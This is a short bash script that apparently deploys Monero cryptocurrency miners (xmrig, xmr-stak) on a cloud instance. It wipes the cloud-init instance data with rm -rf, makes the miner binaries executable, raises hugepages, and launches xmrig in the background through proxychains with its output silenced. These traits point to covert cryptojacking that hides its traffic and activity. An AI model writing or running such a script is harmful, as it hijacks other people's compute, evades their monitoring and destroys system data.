#!/bin/bash
rm -rf /var/lib/cloud/instance/*
sudo chmod +x /m/test01/proxychains-ng/proxychains4
sudo chmod +x /m/test01/proxychains-ng/libproxychains4.so
sudo chmod +x /m/test01/xmr/xmr-stak-cpu
sudo sysctl -w vm.nr_hugepages=128
sudo chmod +x /m/test01/xmrig-nvidia/build/xmrig-nvidia
sudo chmod +x /m/test01/xmrig/build/xmrig
/m/test01/proxychains-ng/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmrig/build/xmrig --config=/m/test01/xmrig/build/config.json 2>&1 1> /dev/null&
#/m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmrig-nvidia/build/xmrig-nvidia --config=/m/test01/xmrig-nvidia/build/config.json 2>&1 1> /dev/null&
